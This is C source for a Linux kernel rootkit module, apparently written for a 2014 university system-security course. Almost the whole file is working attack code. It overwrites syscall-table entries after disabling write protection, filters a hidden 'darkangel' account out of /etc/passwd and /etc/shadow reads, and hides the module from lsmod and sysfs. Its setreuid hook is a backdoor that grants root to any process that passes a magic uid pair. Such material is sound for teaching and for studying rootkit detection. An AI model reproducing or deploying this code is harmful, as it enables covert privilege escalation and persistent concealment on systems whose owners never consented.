/**********************************************************
	Last Updated: Nov 1, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description
		main function 
		device registration
		syscall table hijacking
***********************************************************/

#include "../headers/all.h"

/* 
	Get system call table address from System.map
		$ sudo cat /boot/System.map-`uname -r` | grep sys_call_table
		ffffffff81801300 R sys_call_table
	The following command will not work in kernel 3.x
		$ sudo cat /proc/kallsyms | grep sys_call_table
		0000000000000000 R sys_call_table
*/
void **sys_call_table = (void *)0xffffffff81801300;
//static unsigned long *sys_call_table = (unsigned long *) 0xffffffff81801300;

// Get the addresses of the original system calls
asmlinkage long (*original_write)(unsigned int, const char*, size_t);
asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64*, unsigned int);
asmlinkage long (*original_setreuid)(uid_t, uid_t);
asmlinkage long (*original_open)(const char*, int, int);
asmlinkage long (*original_read)(unsigned int, char *buf, size_t);

// Extern symbols here:
extern char rk_buf[BUFLEN];
extern int is_open;
extern struct miscdevice kcr;
extern asmlinkage int my_getdents(unsigned int, struct linux_dirent64*, unsigned int);

static struct list_head *saved_mod_list_head;
struct kobject *saved_kobj_parent;
struct file* hide_contents(char* file, char* target, char* hidden);

/*By Chen
 *
 * in buf special types: 4B + 8B_prifix+ strlen(TARGET)+4B_surfix + 2B(white space) 
 * Original code is implemented in:
 * SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
 * in fs\read_write.c (MACRO!!!!)
 * */
asmlinkage long 
my_write(unsigned int fd, char *buf, size_t nbyte){
	//char *index1, *index2;
	//char *hide_str = "test";
	//bool is_special = 1;
	//	char *str2 = "flush.sh";
	if(fd == 1){
		
//		if(index1 = strstr(buf, hide_str)){
//			return -1;
//			index2 = strstr(buf, str2);
/*
			int offset = is_special?strlen(hide_str) +4+2:strlen(hide_str)+2;
			printk("target len %d, test ahead : %s\n ", strlen(hide_str),  index1-8);
			if(is_special)
				memcpy(index1-8, index1+offset, strlen(index1+offset));
			else
				memcpy(index1, index1+offset, strlen(index1+offset));
				*/
//		}
	}	
	return original_write(fd, buf, nbyte);
}

asmlinkage long
my_read(unsigned int fd, char *buf, size_t count) {
	
	struct file *file;
	ssize_t ret = -EBADF;
	file = fget(fd);
	
	u64 file_inode;
	dev_t file_dev;
	umode_t file_mode;
	loff_t file_size;
	int r;
	
	char* file_name, file_parent;
	char *ptr1, *ptr2, *ptr3;
	char *passwd = "/etc/passwd";
	char *shadow = "/etc/shadow";
	char *hide_str = "darkangel";	// ptr2
	char *delimiter = "\n";	// ptr3
	int i, buf_len_to_copy;
	
	struct kstat file_ksp;
	r = vfs_stat(file, &file_ksp);
	file_inode = file_ksp.ino;
	//file_dev = file_ksp.dev;
	//file_mode = file_ksp.mode;
	//file_size = file_ksp.size;
	char* abs_path;
	char *tmp;
	
	struct nameidata nd;
	struct path file_path;
	
	if (file) {
		//file_name = file->f_path.dentry->d_name.name;
		file_path = file->f_path;
		path_get(&file->f_path);
		tmp = (char *)__get_free_page(GFP_TEMPORARY);
		abs_path = d_path(&file_path, tmp, PAGE_SIZE);
		path_put(&file_path);
		free_page((unsigned long)tmp);
		
		loff_t pos = file->f_pos;
		
		if((strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0) && strlen(buf) > 0) {
			//abs_path = dentry_path(file->f_path.dentry, file_name, strlen(file_name));
			
			printk("READ: %s with inode 0x%x\n", abs_path, file_inode);
			//printk("[FD]: 0x%x, dev: 0x%x, mode: 0x%x, size: 0x%x\n", fd, file_dev, file_mode, file_size);
			printk("[Org_Buf_Size]:0x%x\n", strlen(buf));
			
			ptr1 = buf;
			ptr2 = strstr(buf, hide_str);
			ptr3 = ptr2;
			while (*ptr3 != *delimiter)
				ptr3++;

			buf_len_to_copy = (ptr1 + strlen(buf) - ptr3);
			printk("buf_len_to_copy: %d\n", buf_len_to_copy);
			printk("Ptr1(Contents): %p, Ptr2(hide_str): %p, Ptr3(end hide_str): %p\n", ptr1, ptr2, ptr3);
			
			//memcpy(ptr2, ptr3, buf_len_to_copy);
			
			ptr3++;
			for (i = 0; i < buf_len_to_copy; i++)
				*ptr2++ = *ptr3++;
			buf[(void*)ptr2 - (void*)ptr1] = NULL;
			
			
			ret = vfs_read(file, buf, strlen(buf), ptr1);
			//file->f_pos = pos;
			
			printk("[End_Buf_Size]: 0x%x\n", strlen(buf));
			printk("%s\n", buf);
			return ret;
		}
		
		ret = vfs_read(file, buf, count, &pos);
		file->f_pos = pos;
		fput(file);
	}

	return ret;
	//return original_read(fd, buf, count);
}

/* BACKDOOR by Koo: 
 *
 * If a certain set of (ruid/euid) is configured to a normal program with a user privilege, 
 * it will obtain a root privilege with this backdoor at once
 *
 * */
asmlinkage long
my_setreuid(uid_t ruid, uid_t euid) {
	// Hooking a certain condition below
	if( (ruid == 1234) && (euid == 5678) ) {
		struct cred *credential = prepare_creds();

		// Set the permission of the current process to root
		credential -> uid = 0;
		credential -> gid = 0;
		credential -> euid = 0;
		credential -> egid = 0;
		credential -> suid = 0;
		credential -> sgid = 0;
		credential -> fsuid = 0;
		credential -> fsgid = 0;
		
		return commit_creds(credential);
	}
	
	// Otherwise just call original function
	return original_setreuid(ruid, euid);
}

// file = [pwd | shadow]
// target = [tmppwd | tmpshadow]
struct file* hide_contents(char* file, char* target, char* hidden) {
	// MIGHT CONTAIN A BUG HERE
	struct file *fp = NULL;
	struct file *fp_target = NULL;
	
	struct kstat file_ksp, target_ksp;
	char *contents;
	char *line;
	
	char *delim = "\n";
	loff_t file_size;
	u64 file_inode, target_inode;
	int r1, r2;
	
	mm_segment_t prev_fs;
	// Get the current FS segment descriptor
	prev_fs = get_fs();
	// Set the segment descriptor in kernel
	set_fs(KERNEL_DS);
	
	r1 = vfs_stat(file, &file_ksp);
	r2 = vfs_stat(target, &target_ksp);
	file_inode = file_ksp.ino;
	target_inode = target_ksp.ino;
	
	file_size = file_ksp.size;
	fp = filp_open(file, O_RDONLY, 0);
	
	//fp_target = filp_open(target, flags, mode);
	fp_target = filp_open(target, O_WRONLY|O_CREAT, 0644);
	
	contents = (char *) kmalloc(sizeof(char) * file_size, __GFP_IO);
	vfs_read(fp, contents, file_size, &fp->f_pos);
	//printk(KERN_INFO "Filesize: %lld\n", file_size);

	while((line = strsep(&contents, delim)) != NULL) {
		if(strncmp(line, hidden, strlen(hidden)) == 0) {
			//vfs_write(fp_target, delim, strlen(delim), &fp_target->f_pos);
			continue;
		}
		else {
			vfs_write(fp_target, line, strlen(line), &fp_target->f_pos);
			vfs_write(fp_target, delim, strlen(delim), &fp_target->f_pos);
		}
	}
	
	filp_close(fp, NULL);
	//filp_close(fp_target, NULL);
	
	// Reset the segment descriptor
	set_fs(prev_fs);
	return fp_target;
}


/* Koo: 
 *
 * Checking if the file to open is the target to manipulate its content
 * 		ssize_t vfs_read(struct file *, char __user *, size_t, loff_t *);
 * 		ssize_t vfs_write(struct file *, const char __user *, size_t, loff_t *);
 * */
asmlinkage long
my_open(const char* file, int flags, int mode) {
	/* 
	char *pwd = "/etc/passwd";
	char *shadow = "/etc/shadow";
	char *tmppwd = "/tmp/tmppwd";
	char *tmpshadow = "/tmp/tmpshadow";
	char *hidden = "darkangel";
	
	if (strncmp(file, pwd, strlen(file)) == 0) {
		//printk("file inode = %p, passwd inode = %p\n", (void*)file_inode, (void*)pwd_inode);
		//hide_contents(pwd, tmppwd, hidden);
		printk("%s - mode: %d\n", pwd, mode);
	}
	
	if (strncmp(file, shadow, strlen(file)) == 0) {
		//printk("file inode = %p, shadow inode = %p\n", (void*)file_inode, (void*)shadow_inode);
		//hide_contents(shadow, tmpshadow, hidden);
		printk("%s - mode: %d\n", shadow, mode);
	}
	*/
	
	return original_open(file, flags, mode);
}

/* Koo: 
 *
 * Hiding/Unhiding the module itself
 *		<linux/export.h>
 *			struct module __this_module
 *			#define THIS_MODULE (&__this_module)
 *		<linux/kobject.h>
 *			void kobject_del(struct kobject *kobj);
 *			int kobject_add(struct kobject *kobj, struct kobject *parent, const char fmt, ...);
 *		<linux/list.h>
 *			void list_del(struct list_head *entry)
 *			void list_add(struct list_head *new, struct list_head *head)
 * Testing to find the module in kernel
 *	a. lsmod | grep kcr
 *	b. modprobe
 *	c. cat /proc/modules | grep kcr
 *	d. cat /proc/kallsyms | grep "\[kcr\]"
 *	e. ls -la /sys/module | grep kcr
 * */
void
hiding_module(void) {
	// Save the addr of this module to restore if necessary
	saved_mod_list_head = THIS_MODULE->list.prev;
	saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
	
	// Remove this module from the module list and kobject list
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	// Remove the symbol and string tables for kallsyms
	// IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
	// "sysfs group ffff8800260e4000 not found for kobject 'rt'"
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Module successully hidden!\n");
}

void
unhiding_module(void) {
	int r;
	
	// Restore this module to the module list and kobject list
	list_add(&THIS_MODULE->list, saved_mod_list_head);
	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "rt")) < 0)
		printk(KERN_ALERT "Error to restore kobject to the list back!!\n");
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Module successully revealed!\n");
}

// Entry function for kernel module initialization
int 
__init init_mod(void) {
	
	if (DEBUG == 1) {
		printk(KERN_ALERT "Entering hooking module!\n");
		printk(KERN_INFO "This process is \"%s\" (pid %i)\n", current->comm, current->pid);
	}
	
	misc_register(&kcr);
	
	// Get original system call addr in asm/unistd.h
	original_write = sys_call_table[__NR_write];			// __NR_write 64
	original_getdents = sys_call_table[__NR_getdents64];	// __NR_getdents64 61
	original_setreuid = sys_call_table[__NR_setreuid];		// __NR_setreuid 145
	original_open = sys_call_table[__NR_open];				// __NR_open 1024
	original_read = sys_call_table[__NR_read];				// __NR_open 63
	
	// Set system call table to be writable by changing cr0 register
	PROT_DISABLE;
	
	// Overwrite manipulated system calls
	sys_call_table[__NR_write] = my_write;
	sys_call_table[__NR_getdents64] = my_getdents;
	sys_call_table[__NR_setreuid] = my_setreuid;
	sys_call_table[__NR_open] = my_open;
	sys_call_table[__NR_read] = my_read;
	
	if (DEBUG == 1) {
		printk(KERN_INFO "Original/Hooked syscall for write(): 0x%p / 0x%p\n", 
			(void*)original_write, (void*)my_write);
		printk(KERN_INFO "Original/Hooked syscall for getdents(): 0x%p / 0x%p\n", 
			(void*)original_getdents, (void*)my_getdents);
		printk(KERN_INFO "Original/Hooked syscall for setreuid(): 0x%p / 0x%p\n", 
			(void*)original_setreuid, (void*)my_setreuid);
		printk(KERN_INFO "Original/Hooked syscall for open(): 0x%p / 0x%p\n", 
			(void*)original_open, (void*)my_open);
		printk(KERN_INFO "Original/Hooked syscall for read(): 0x%p / 0x%p\n", 
			(void*)original_read, (void*)my_read);
	}
	
	//Changing the control bit back
	PROT_ENABLE;
	
	//hiding_module();
	//unhiding_module();
	
	return 0;
}

// Exit function for kernel module termination
void
__exit exit_mod(void){
	
	 misc_deregister(&kcr);
	 
	// Restore all system calls to the original ones
	PROT_DISABLE;
	sys_call_table[__NR_write] = original_write;
	sys_call_table[__NR_getdents64] = original_getdents;
	sys_call_table[__NR_setreuid] = original_setreuid;
	sys_call_table[__NR_open] = original_open;
	sys_call_table[__NR_read] = original_read;
	PROT_ENABLE;
	
	if (DEBUG == 1) {
		printk(KERN_ALERT "Exiting hooking module!\n");
	}

}

module_init(init_mod);
module_exit(exit_mod);

/* 
	GENERAL INFORMATION ABOUT THE KERNEL MODULE
	THIS PART SHOULD BE REMOVED IN REAL ROOTKIT! :)
*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("hykoo & yaohchen");
MODULE_DESCRIPTION("CSE509-PJT");
MODULE_VERSION("0.1");
MODULE_SUPPORTED_DEVICE("Tested with kernel 3.2.0-29-generic in Ubuntu");